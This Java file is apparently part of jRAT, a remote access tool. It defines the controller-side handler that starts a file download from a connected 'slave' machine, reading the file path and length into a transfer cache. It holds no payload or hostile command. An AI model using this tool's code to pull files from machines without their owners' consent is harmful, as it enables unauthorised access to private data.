package jrat.module.fs.packets.download;

import jrat.common.io.FileCache;
import jrat.common.io.TransferData;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;


public class Packet30BeginDownload implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String file = slave.readLine();
		long length = slave.readLong();
		
		TransferData data = FileCache.get(file);

		if (data != null) {
			data.setRemoteFile(file);
			data.setTotal(length);
			data.setObject(slave);
		}
	}

}
